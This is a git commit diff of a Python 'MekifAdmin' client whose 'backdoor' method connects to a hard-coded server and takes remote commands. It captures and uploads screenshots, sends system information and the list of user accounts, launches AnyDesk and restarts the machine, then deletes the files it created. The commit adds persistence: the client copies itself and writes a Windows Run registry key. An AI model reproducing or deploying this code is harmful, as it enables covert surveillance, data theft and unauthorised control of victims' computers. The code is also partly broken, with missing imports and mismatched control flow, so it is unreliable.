8cf2a29b3a5ab4ad63bf34bf08c8b1b141339416
Gil Shwartz <58849439+GShwartz@users.noreply.github.com>
2022-04-16 04:06:25 +0300

    Update client.py

--- MekifAdmin/client.py
+++ MekifAdmin/client.py
@@ -7,10 +7,13 @@ from datetime import datetime
 import random
 import socket
 import time
-import tqdm
 import os
 import sys
 import struct
+import winreg
+import shutil
+import psutil
+import win32gui
 
 
 class Client:
@@ -22,10 +25,6 @@ class Client:
         self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
         self.hostname = socket.gethostname()
         self.localIP = str(socket.gethostbyname(self.hostname))
-        self.filename = \
-            rf"c:\Users\{os.getlogin()}\Desktop\screenshot {self.hostname} {str(self.localIP)} {self.dt}.jpg"
-        self.systeminfofile = rf"c:\Users\{os.getlogin()}\Desktop\systeminfo " \
-                              rf"{self.hostname} {str(self.localIP)} {self.dt}.txt"
 
     def connection(self):
         soc = socket.socket()
@@ -42,44 +41,12 @@ class Client:
                 print(colored(e, 'red'))
                 break
 
-    def send_files(self, soc):
-        chunk = 1000000
-        sysinfo = open(self.filename, 'rb')
-        msg = soc.recv(1024).decode()
-        print(msg)
-
-        while True:
-            data = sysinfo.read(chunk)
-            soc.sendall(data)
-
-            if not data:
-                sysinfo.close()
-                break
-
-        msg = soc.recv(1024).decode()
-        print(f"@Server: {msg}")
-
-    def boot_time(self, soc):
-        sysinfo = open(self.systeminfofile, 'w')
-        sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
-        sysinfo.close()
-        soc.send(f"{self.systeminfofile}".encode())
-
-        time.sleep(2)
-        sysinfo = open(self.systeminfofile, 'r')
-        while True:
-            data = sysinfo.read(1024)
-            soc.sendall(data.encode())
-
-            if not data:
-                sysinfo.close()
-                break
-
-        # soc.shutdown(1)
-        msg = soc.recv(1024).decode()
-        print(f"@Server: {msg}")
-
     def backdoor(self, soc):
+        # Send Computer Name to Server
+        ident = self.hostname
+        soc.send(ident.encode())
+
+        # Wait For Commands
         message = soc.recv(self.buffer_size).decode()
         print(f"{colored(message, 'green')}")
 
@@ -90,10 +57,14 @@ class Client:
                     print(colored("[!]Disconnected!", 'red'))
                     break
 
-                if str(command.lower()[:6]) == "screen":
-                    path = rf'c:\Users\{os.getlogin()}\Desktop'
-                    name = 'sc.ps1'
-                    with open(rf'{path}\{name}', 'w+') as file:
+                # Capture Screenshot
+                elif str(command.lower()[:6]) == "screen":
+                    self.d = datetime.now().replace(microsecond=0)
+                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+                    self.filename = \
+                        rf"c:\Users\{os.getlogin()}\Desktop\screenshot {self.hostname} {str(self.localIP)} {self.dt}.jpg"
+                    path = rf'c:\Users\{os.getlogin()}\Desktop\screenshot.ps1'
+                    with open(path, 'w') as file:
                         file.write("Add-Type -AssemblyName System.Windows.Forms\n")
                         file.write("Add-Type -AssemblyName System.Drawing\n\n")
                         file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
@@ -107,43 +78,133 @@ class Client:
                         file.write(rf"$bitmap.Save('{self.filename}')")
 
                     time.sleep(0.2)
-                    ps = subprocess.Popen(["powershell.exe", rf"C:\Users\{os.getlogin()}\Desktop\sc.ps1"], stdout=sys.stdout)
+
+                    ps = subprocess.Popen(["powershell.exe", rf"{path}"], stdout=sys.stdout)
                     ps.communicate()
                     soc.send(f"{self.filename}".encode())
-                    self.send_files(soc)
+                    # self.send_files(soc)
+                    chunk = 1000000
+                    sysinfo = open(self.filename, 'rb')
+                    msg = soc.recv(1024).decode()
+                    print(msg)
+
+                    while True:
+                        data = sysinfo.read(chunk)
+                        soc.sendall(data)
+
+                        if not data:
+                            sysinfo.close()
+                            break
+
+                    msg = soc.recv(1024).decode()
+                    print(f"@Server: {msg}")
                     soc.send(f"@{self.hostname} | {self.localIP}: Screenshot Completed.\n".encode())
+                    os.remove(self.filename)
+                    os.remove(path)
 
-                if str(command.lower()[:7]) == "anydesk":
-                    # Start Anydesk
-                    subprocess.call(r"C:\Program Files (x86)\AnyDesk\anydesk.exe")
-                    soc.send(f"@{self.hostname} | {self.localIP}: Anydesk Started.\n".encode())
+                # Get System Information & Users
+                elif str(command.lower()[:2]) == "si":
+                    self.d = datetime.now().replace(microsecond=0)
+                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+                    self.systeminfofile = rf"c:\Users\{os.getlogin()}\Desktop\systeminfo " \
+                                          rf"{self.hostname} {str(self.localIP)} {self.dt}.txt"
+
+                    # self.boot_time(soc, systeminfofile)
+                    sysinfo = open(self.systeminfofile, 'w')
+                    sinfo = subprocess.call(['systeminfo'], stdout=sysinfo)
+                    sysinfo.write("\n")
+                    allusers = subprocess.call(['net', 'user'], stdout=sysinfo)
+                    sysinfo.close()
+                    soc.send(f"{self.systeminfofile}".encode())
+
+                    time.sleep(2)
+                    sysinfo = open(self.systeminfofile, 'r')
+                    while True:
+                        data = sysinfo.read(1024)
+                        soc.sendall(data.encode())
+
+                        if not data:
+                            sysinfo.close()
+                            break
+
+                    # soc.shutdown(1)
+                    msg = soc.recv(1024).decode()
+                    print(f"@Server: {msg}")
+                    soc.send(f"@{self.hostname} | {self.localIP}: System Information Sent.\n".encode())
+                    os.remove(self.systeminfofile)
+
                     continue
 
-                if str(command.lower()[:2]) == "bt":
-                    self.boot_time(soc)
+                # Get Last Restart Time
+                elif str(command).lower()[:2] == "lr":
+                    self.d = datetime.now().replace(microsecond=0)
+                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+                    last_reboot = psutil.boot_time()
+                    soc.send(f"@{self.hostname} | {self.localIP}: "
+                             f"{datetime.fromtimestamp(last_reboot).replace(microsecond=0)}".encode())
                     continue
 
-                if str(command.lower()[:7]) == "restart":
+                # Get Current Logged-on User
+                elif str(command).lower()[:4] == "user":
+                    self.d = datetime.now().replace(microsecond=0)
+                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+                    current_user = os.getlogin()
+                    soc.send(f"@{self.hostname} | {self.localIP}: Current User: {current_user}.\n".encode())
+                    continue
+
+                # Run Anydesk
+                elif str(command.lower()[:7]) == "anydesk":
+                    self.d = datetime.now().replace(microsecond=0)
+                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
+                    subprocess.call([r"C:\Program Files (x86)\AnyDesk\anydesk.exe"])
+                    continue
+
+                # Restart Machine
+                elif str(command.lower()[:7]) == "restart":
+                    self.d = datetime.now().replace(microsecond=0)
+                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                     os.system('shutdown /r /t 1')
 
-                if str(command.lower()) == "exit":
+                # Close Connection
+                elif str(command.lower()) == "exit":
+                    self.d = datetime.now().replace(microsecond=0)
+                    self.dt = str(self.d.strftime("%b %d %Y %I.%M.%S %p"))
                     print(colored('[!]Connection closed by server.', 'yellow'))
-                    soc.shutdown(2)
+                    soc.shutdown(socket.SHUT_RDWR)
                     soc.close()
-                    sys.exit()
+                    self.connection()
 
             except Exception as err:
                 print(colored(f"Error: {err} \n[!]Connection closed.", 'red'))
-                break
+                self.connection()
 
-        soc.shutdown(socket.SHUT_RD)
-        soc = socket.socket()
-        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        soc.close()
         self.connection()
 
 
+def persistence(duration):
+    time.sleep(duration)
+    command = \
+        r"Set-Itemproperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' " \
+        r"-Name 'MekifRemoteAdmin' -Value 'c:\client.py' -Force"
+
+    run_powershell(command)
+    return True
+
+
+def run_powershell(cmd):
+    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+    return completed
+
+
 if __name__ == "__main__":
+    script_path = os.path.realpath(__file__)
+    script_file_name = os.path.basename(script_path)
+    target_path = fr"c:\Users\{os.getlogin()}\Downloads\{str(script_file_name).replace('py', 'exe')}"
+    shutil.copyfile(script_path, target_path)
+    persistence_thread = threading.Thread(target=persistence,
+                                          args=(1, ), name='Persistence Thread')
+    persistence_thread.start()
+
     port = 55400
     servers = [('192.168.1.10', port)]
     while True:
